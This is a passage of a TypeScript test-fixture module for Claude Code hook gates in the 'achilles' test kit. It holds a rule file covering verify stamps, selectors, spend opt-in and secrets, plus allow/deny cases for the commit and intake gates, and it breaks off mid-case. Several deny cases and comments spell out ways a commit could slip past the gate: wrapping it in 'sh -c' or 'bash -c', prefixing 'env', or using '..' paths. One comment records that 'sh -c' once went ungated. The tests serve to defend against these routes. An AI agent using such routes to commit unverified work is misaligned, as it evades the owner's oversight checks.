// Generated from the 0.2.x factory gate cases (claude-code/tests/specs/factory/*.json, now removed) and the
// fixture project they ran against. Each case is one rule's executable statement: {{ROOT}} is the project root.
// The rule file is the example one from schemas/factory-rules.example.json, copied here so a kit test can import it.
// Cases left out: a payload shape this build has no tool for, an allow-with-warning of the bash runtime, drives a real CLI or jq through PATH, tests the bash runtime missing a tool.
export const RULES = {
  "$schema": "https://raw.githubusercontent.com/civitas-cerebrum/achilles/main/schemas/factory-rules.schema.json",
  "version": 1,
  "contexts": {
    "north": { "baseUrl": "${SHOP_BASE_URL_NORTH}", "storageState": "tests/data/.auth/shopper-a.json", "description": "Region north, account shopper-a." },
    "south": { "baseUrl": "${SHOP_BASE_URL_SOUTH}", "storageState": "tests/data/.auth/shopper-b.json", "description": "Region south, account shopper-b." }
  },
  "rules": {
    "selectors.no-inline": {
      "description": "Browser selectors and raw Playwright locator/navigation calls never appear inline in fixtures, specs, setup or support code; every element is referenced by repository name.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#selectors.no-inline",
      "scope": ["tests/fixtures/**", "tests/e2e/**", "tests/setup/**", "tests/support/**"],
      "forbidden": ["data-testid=", "data-test", "[data-", "getByRole(", "getByText(", "getByTestId(", "getByLabel(",
                    "getByPlaceholder(", "getByAltText(", "getByTitle(", ".locator(", "frameLocator(", ".frame(",
                    "page.goto(", "page.click(", "page.fill(", "page.waitFor", "page.evaluate(", "page.getBy", "page.$",
                    "page.keyboard", "page.mouse", "querySelector", "xpath=", "css=", "text=", "role=", ":visible", "[aria-"],
      "allowed": ["extractAttribute:", "getAttribute(", "page.context()", "addInitScript(", "addStyleTag("],
      "action": "Reference the element by repository name: steps.<verb>('<element>', '<Page>'). If the element is not in tests/e2e/page-repository.json, add it with live evidence first (selectors.evidence)."
    },
    "selectors.evidence": {
      "description": "Every new or changed page-repository selector has a live evidence note, or is marked provisional.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#selectors.evidence",
      "repository": "tests/e2e/page-repository.json",
      "provisionalKey": "provisional",
      "action": "Insert the entry with \"provisional\": true, run npx achilles-selector-evidence --page <Page> --element <element> --context <north|south> (live inspection first), then drop the flag in the same change; an entry that stays provisional needs a known-issues row."
    },
    "specs.shape": {
      "description": "Every new UI spec traces each test title to a written scenario block; frozen directories take no new files.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#specs.shape",
      "scope": ["tests/e2e/**"],
      "exclude": ["tests/e2e/api/**"],
      "frozenDirs": ["tests/e2e/legacy"],
      "titleIdPattern": "^[A-Z]{2,5}-\\d{2,3}[a-z]? — ",
      "scenarioDocs": ["docs/scenarios.md"],
      "lint": ["node", "scripts/scenario-lint.mjs", "--quiet"],
      "tags": ["@e2e", "@checkout", "@negative", "@smoke"],
      "blockEnums": {
        "type": ["@e2e", "@checkout", "@negative", "@smoke"],
        "oracle": ["UI-only", "api", "db"],
        "spendPolicy": ["none", "disposable", "released", "one-confirming-run"],
        "status": ["proposed", "implemented", "green", "red-by-design", "blocked", "omitted-by-ruling"]
      },
      "action": "Title the test '<ID> — <scenario title>' with the id of its block in docs/scenarios.md (write or update the block first and lint it), then write the spec from it."
    },
    "spend.opt-in": {
      "description": "Specs that place real orders are listed; running one needs a per-command opt-in.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#spend.opt-in",
      "list": "tests/spend-list.json",
      "optInEnv": "SPEND_OPT_IN",
      "optInFlag": "--include-spend",
      "wrapper": "scripts/run-suite.mjs",
      "spendProjects": ["south"],
      "spendScripts": ["test:south"],
      "action": "Prefix the command with SPEND_OPT_IN=1 for an owner-approved run (one per scenario), or use node scripts/run-suite.mjs, which excludes the listed specs unless --include-spend is passed."
    },
    "secrets.none": {
      "description": "No email addresses, phone numbers or tokens appear in committed tests, docs, scripts or project skills; only environment variable names do.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#secrets.none",
      "scope": ["tests/**", "docs/**", "scripts/**", ".claude/skills/project-*/**", "README.md", "CLAUDE.md"],
      "patterns": ["[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[a-z]{2,}", "\\+[1-9]\\d{9,14}", "eyJ[A-Za-z0-9_-]{20,}\\."],
      "allowlist": ["docs/conventions/secrets.md", "tests/unit/fixtures/", "someone\u0040example.test"],
      "action": "Replace the value with the name of the environment variable that holds it (e.g. SHOPPER_A_EMAIL) and read it via process.env; placeholders look like <SHOPPER_A_EMAIL>."
    },
    "process.evidence": {
      "description": "Commits land with a fresh content-hash verify stamp and, for the current change, its verification report.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#process.evidence",
      "stamp": ".factory/verify-stamp",
      "currentChange": ".factory/current-change",
      "trailDir": "docs/evidence",
      "required": ["verify.md"],
      "hashCommand": ["node", "scripts/tree-hash.mjs"],
      "action": "npm run verify (then commit); for a change with an evidence trail: npm run change:start -- <slug>, fill brief.md, have the verifier write verify.md. Without .factory/current-change (a maintenance commit) only the stamp is checked."
    },
    "process.state": {
      "description": "The process-state directory (verify stamp, current-change marker) is written only by the project's own tools.",
      "doc": "skills/achilles-protocol/references/factory-gates.md#process.state",
      "stateDir": ".factory",
      "action": "Never write, move or delete .factory/ files by hand: the stamp is written only by npm run verify and the change marker only by npm run change:start; removing the marker after the last commit of a change is an owner action. Reading them (cat) is fine."
    }
  }
}

export const FIXTURE = {
  "tests/spend-list.json": "{\n  \"specs\": [\n    \"tests/e2e/south/checkout-order.spec.ts\",\n    \"tests/e2e/south/wallet-order.spec.ts\"\n  ]\n}\n",
  "docs/scenarios.md": "# Scenarios\n\n#### CHK-01 \u2014 Card: place an order and verify it in the orders service\n\n- **Oracle**: GET /orders/<id> reports placed.\n\n#### CHK-03 \u2014 Cancelling the wallet popup returns to checkout without an order\n\n- **Oracle**: GET /orders lists no new order.\n\n#### CHK-06 \u2014 Card, registered shopper: place an order\n\n- **Oracle**: GET /orders/<id> reports placed.\n\n#### CHK-98 \u2014 a block that exists but fails the lint\n\n- **Purpose**: the block is present but has no oracle line.\n- **Expected**: the total is not zero.\n",
  "scripts/scenario-lint-stub.mjs": "import { readFileSync } from 'node:fs';\nconst a = process.argv.slice(2);\nconst id = a[a.indexOf('--id') + 1];\nconst text = a.filter((x) => x.endsWith('.md')).map((d) => readFileSync(d, 'utf8')).join('\\n');\nconst block = text.split(/^#+ /m).find((b) => b.startsWith(id + ' ')) ?? '';\nif (!block.includes('**Oracle**')) { console.log('[specs.shape] ' + id + ': missing **Oracle**'); process.exit(1); }\n"
}

export const CASES = [
 {
  "name": "commit-gate.allow-cd-other-repo-then-commit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "cd /private/tmp/some-other-repo && git add -A && git commit -m \"docs: elsewhere\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false
 },
 {
  "name": "commit-gate.allow-change-with-verify",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git commit -m \"feat: demo\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "package.json": "{}\n",
   "scripts/tree-hash.mjs": "import { createHash } from 'node:crypto';\nimport { readdirSync, readFileSync, statSync } from 'node:fs';\nconst lines = [];\nconst walk = (p) => { let st; try { st = statSync(p); } catch { return; }\n  if (st.isDirectory()) { for (const e of readdirSync(p)) walk(p + '/' + e); return; }\n  lines.push(p + ' ' + createHash('sha1').update(readFileSync(p)).digest('hex')); };\nfor (const r of ['tests', 'docs', 'scripts', 'package.json']) walk(r);\nconsole.log(createHash('sha1').update(lines.sort().join('\\n')).digest('hex'));\n",
   ".factory/current-change": "2026-09-30-demo\n",
   "docs/evidence/2026-09-30-demo/brief.md": "# Change 2026-09-30-demo\n",
   "docs/evidence/2026-09-30-demo/verify.md": "# Verify\n"
  },
  "stamp": "fresh",
  "warn": false
 },
 {
  "name": "commit-gate.allow-fresh-stamp",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git commit -am \"feat: x\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "package.json": "{}\n",
   "scripts/tree-hash.mjs": "import { createHash } from 'node:crypto';\nimport { readdirSync, readFileSync, statSync } from 'node:fs';\nconst lines = [];\nconst walk = (p) => { let st; try { st = statSync(p); } catch { return; }\n  if (st.isDirectory()) { for (const e of readdirSync(p)) walk(p + '/' + e); return; }\n  lines.push(p + ' ' + createHash('sha1').update(readFileSync(p)).digest('hex')); };\nfor (const r of ['tests', 'docs', 'scripts', 'package.json']) walk(r);\nconsole.log(createHash('sha1').update(lines.sort().join('\\n')).digest('hex'));\n",
   "tests/e2e/x.spec.ts": "// x\n"
  },
  "stamp": "fresh",
  "warn": false
 },
 {
  "name": "commit-gate.allow-no-pager-dash-c-other-repo",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git --no-pager -C /private/tmp/some-other-repo commit -m \"docs: elsewhere\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false
 },
 {
  "name": "commit-gate.allow-other-repo-dash-c",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git -C /private/tmp/some-other-repo commit -m \"docs: elsewhere\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false
 },
 {
  "name": "commit-gate.allow-other-repo",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "/private/tmp/some-other-repo",
   "tool_input": {
    "command": "git commit -m \"docs: elsewhere\""
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false
 },
 {
  "name": "commit-gate.allow-quoted-commit-in-echo",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "echo 'git commit -m x'"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false,
  "_comment": "Quote awareness cuts both ways: `git commit` inside a quoted argument of echo is one token and no command at all, so it must not be gated."
 },
 {
  "name": "commit-gate.allow-sh-dash-c-other-repo",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "sh -c 'cd /tmp && git commit -m \"feat: x\"'"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false,
  "_comment": "Reading the nested string must not over-gate: a commit the `cd` moved out of this project is another repository's business, so a clean allow."
 },
 {
  "name": "commit-gate.deny-amend-no-edit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git commit --amend --no-edit"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "commit-gate.deny-bash-dash-c-commit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "bash -c 'git commit -m \"feat: x\"'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "No verify stamp (.factory/verify-stamp missing)",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "_comment": "Same hole as sh -c, with the shell an agent reaches for most often."
 },
 {
  "name": "commit-gate.deny-bash-lc-cd-then-commit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "bash -lc 'cd . && git commit -m \"feat: x\"'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "No verify stamp (.factory/verify-stamp missing)",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "_comment": "A `cd` inside the nested string moves the directory for the rest of THAT string; `.` keeps it inside the project, so the commit is still gated."
 },
 {
  "name": "commit-gate.deny-cd-into-repo",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "/private/tmp/some-other-repo",
   "tool_input": {
    "command": "cd {{ROOT}} && git commit -m x"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "commit-gate.deny-change-without-verify",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git commit -m \"feat: demo\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence",
   "The current change docs/evidence/2026-09-30-demo/ has no verify.md.",
   "only the stamp is checked"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "package.json": "{}\n",
   "scripts/tree-hash.mjs": "import { createHash } from 'node:crypto';\nimport { readdirSync, readFileSync, statSync } from 'node:fs';\nconst lines = [];\nconst walk = (p) => { let st; try { st = statSync(p); } catch { return; }\n  if (st.isDirectory()) { for (const e of readdirSync(p)) walk(p + '/' + e); return; }\n  lines.push(p + ' ' + createHash('sha1').update(readFileSync(p)).digest('hex')); };\nfor (const r of ['tests', 'docs', 'scripts', 'package.json']) walk(r);\nconsole.log(createHash('sha1').update(lines.sort().join('\\n')).digest('hex'));\n",
   ".factory/current-change": "2026-09-30-demo\n",
   "docs/evidence/2026-09-30-demo/brief.md": "# Change 2026-09-30-demo\n"
  },
  "stamp": "fresh"
 },
 {
  "name": "commit-gate.deny-dash-c-in-other-segment",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git -C /private/tmp/some-other-repo log -1; git commit -m \"feat: here\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "No verify stamp"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "commit-gate.deny-env-git-commit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "env git commit -m \"feat: x\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "No verify stamp (.factory/verify-stamp missing)",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "_comment": "`env` is a pass-through prefix, not a command: the gate peels it (and leading VAR=value assignments) before deciding whether the segment runs git."
 },
 {
  "name": "commit-gate.deny-git-c-option",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git -c core.editor=true commit"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "commit-gate.deny-no-stamp",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git commit -m \"feat: x\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence",
   "No verify stamp (.factory/verify-stamp missing)"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "commit-gate.deny-sh-dash-c-commit",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "sh -c 'git commit -m \"feat: x\"'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "No verify stamp (.factory/verify-stamp missing)",
   "factory-gates.md#process.evidence"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "_comment": "A commit wrapped in `sh -c` is still a commit in this project. The gate's old bash tokeniser required token 0 to be literally `git`, so token 0 `sh` hit `continue` and the commit went ungated."
 },
 {
  "name": "commit-gate.deny-stale-stamp",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git add -A && git commit -m \"feat: x\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.evidence] Tree changed since the last verify (or no verify yet).",
   "\u2192 Do: npm run verify (then commit)",
   "npm run change:start -- <slug>",
   "factory-gates.md#process.evidence",
   "Stamp tree deadbeef \u2260 current tree"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "package.json": "{}\n",
   "scripts/tree-hash.mjs": "import { createHash } from 'node:crypto';\nimport { readdirSync, readFileSync, statSync } from 'node:fs';\nconst lines = [];\nconst walk = (p) => { let st; try { st = statSync(p); } catch { return; }\n  if (st.isDirectory()) { for (const e of readdirSync(p)) walk(p + '/' + e); return; }\n  lines.push(p + ' ' + createHash('sha1').update(readFileSync(p)).digest('hex')); };\nfor (const r of ['tests', 'docs', 'scripts', 'package.json']) walk(r);\nconsole.log(createHash('sha1').update(lines.sort().join('\\n')).digest('hex'));\n",
   "tests/e2e/x.spec.ts": "// x\n"
  },
  "stamp": "deadbeef"
 },
 {
  "name": "commit-gate.ignore-other-git-command",
  "hook": "commit-gate",
  "ruleId": "process.evidence",
  "input": {
   "tool_name": "Bash",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "command": "git status && git log --grep commit"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "warn": false
 },
 {
  "name": "common.allow-jsdoc-mention",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/support/zz-case.ts",
    "content": "/**\n * Never call page.locator( or getByRole( here \u2014\n * use steps.<verb>('<element>', '<Page>').\n */\nexport const x = 1;\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "common.allow-rules-missing",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "content": "{}"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "warn": false,
  "_comment": "No rule file = the project has not opted in: a silent allow, not a warning."
 },
 {
  "name": "common.deny-code-after-block-comments",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/support/zz-case.ts",
    "content": "/* a */ await page.locator('#x') /* b */;\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.no-inline]"
  ]
 },
 {
  "name": "common.deny-dotdot-frozen-path",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/../legacy/zz-new.legacy.spec.ts",
    "content": "export {};\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "tests/e2e/legacy/zz-new.legacy.spec.ts"
  ],
  "_comment": "\"..\" is resolved before the scope decision."
 },
 {
  "name": "intake-gate.allow-api-excluded",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/api/zz-intake.api.spec.ts",
    "content": "test('no id here', async () => {});\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "intake-gate.allow-commented-out-test",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-intake.spec.ts",
    "content": "// test(\"old draft\", async () => {});\n/* test(\"older draft\") */\ntest(\"CHK-06 \u2014 Card, registered shopper: place an order\", async () => {});\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json",
   "docs/scenarios.md",
   {
    "scripts/scenario-lint.mjs": "scripts/scenario-lint-stub.mjs"
   }
  ],
  "warn": false
 },
 {
  "name": "intake-gate.allow-existing-file-edit",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/south/checkout-order.spec.ts",
    "old_string": "a",
    "new_string": "test('no id here', async () => {});"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/south/checkout-order.spec.ts": "export {};\n"
  },
  "warn": false
 },
 {
  "name": "intake-gate.allow-existing-frozen-edit",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/legacy/orders.legacy.spec.ts",
    "old_string": "a",
    "new_string": "b"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/legacy/orders.legacy.spec.ts": "export {};\n"
  },
  "warn": false
 },
 {
  "name": "intake-gate.allow-known-id",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-intake.spec.ts",
    "content": "test.describe('north card', () => {\n  test('CHK-01 \u2014 Card: place an order and verify it in the orders service', async () => {});\n  test(`CHK-03 \u2014 Cancelling the wallet popup returns to checkout without an order`, async () => {});\n});\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json",
   "docs/scenarios.md",
   {
    "scripts/scenario-lint.mjs": "scripts/scenario-lint-stub.mjs"
   }
  ],
  "warn": false
 },
 {
  "name": "intake-gate.allow-lint-missing-absolute-warns",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/region-1/zz-intake.spec.ts",
    "content": "test(\"CHK-98 \u2014 any block\", async () => {});\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "write": {
   "achilles-factory-rules.json": "{\"version\":1,\"rules\":{\"specs.shape\":{\"doc\":\"skills/achilles-protocol/references/factory-gates.md#specs.shape\",\"action\":\"Write the scenario block first.\",\"scope\":[\"tests/e2e/**\"],\"scenarioDocs\":[\"docs/scenarios.md\"],\"titleIdPattern\":\"^[A-Z]{2,5}-\\\\d{2,3}[a-z]? \u2014 \",\"lint\":[\"node\",\"{{ROOT}}/no-such-lint.mjs\"]}}}\n",
   "docs/scenarios.md": "# Scenarios\n\n#### CHK-98 \u2014 any block\n"
  }
 },
 {
  "name": "intake-gate.allow-lint-missing-warns",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/south/zz-intake.spec.ts",
    "content": "test(\"CHK-98 \u2014 a block that exists but fails the lint\", async () => {});\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json",
   "docs/scenarios.md"
  ]
 },
 {
  "name": "intake-gate.allow-new-ui-spec",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-new.spec.ts",
    "content": "export {};\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "intake-gate.allow-pattern-missing-warns",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-intake.spec.ts",
    "content": "test(\"no id\", async () => {});\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "write": {
   "achilles-factory-rules.json": "{\"version\":1,\"rules\":{\"specs.shape\":{\"doc\":\"skills/achilles-protocol/references/factory-gates.md#specs.shape\",\"action\":\"Write the scenario block first.\",\"scope\":[\"tests/e2e/**\"],\"scenarioDocs\":[\"docs/scenarios.md\"],\"exclude\":[\"tests/e2e/api/**\"]}}}\n"
  }
 },
 {
  "name": "intake-gate.deny-dotdot-path",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/api/../north/zz-intake.spec.ts",
    "content": "test('no id here', async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "New spec tests/e2e/north/zz-intake.spec.ts"
  ]
 },
 {
  "name": "intake-gate.deny-id-with-invalid-block",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/south/zz-intake.spec.ts",
    "content": "test(\"CHK-98 \u2014 a block that exists but fails the lint\", async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "CHK-98: missing **Oracle**",
   "factory-gates.md#specs.shape"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json",
   "docs/scenarios.md",
   {
    "scripts/scenario-lint.mjs": "scripts/scenario-lint-stub.mjs"
   }
  ]
 },
 {
  "name": "intake-gate.deny-lint-crash-first-line",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/south/zz-intake.spec.ts",
    "content": "test(\"CHK-98 \u2014 any block\", async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "(CHK-98 \u2014 any block \u2014 lint crashed: boom)",
   "factory-gates.md#specs.shape"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "scripts/scenario-lint.mjs": "process.stderr.write(\"lint crashed: boom\\nsecond line\\n\"); process.exit(1);\n",
   "docs/scenarios.md": "# Scenarios\n\n#### CHK-98 \u2014 any block\n"
  }
 },
 {
  "name": "intake-gate.deny-new-frozen-relative",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "cwd": "{{ROOT}}",
   "tool_input": {
    "file_path": "tests/e2e/legacy/nested/zz-new.ts",
    "content": "export {};\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "frozen tests/e2e/legacy/ directory",
   "factory-gates.md#specs.shape"
  ]
 },
 {
  "name": "intake-gate.deny-new-frozen-spec",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/legacy/zz-new.legacy.spec.ts",
    "content": "test('x', async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "creates a new file under the frozen tests/e2e/legacy/ directory",
   "factory-gates.md#specs.shape"
  ]
 },
 {
  "name": "intake-gate.deny-skip-without-id",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-intake.spec.ts",
    "content": "test.skip(\"parked card case\", async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "(parked card case)"
  ]
 },
 {
  "name": "intake-gate.deny-title-without-id",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-intake.spec.ts",
    "content": "import { test } from '../../fixtures/base';\ntest('CHK-01 \u2014 Card: place an order', async () => {});\ntest('card order without an id', async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "New spec tests/e2e/north/zz-intake.spec.ts has a test without a written scenario (card order without an id).",
   "docs/scenarios.md",
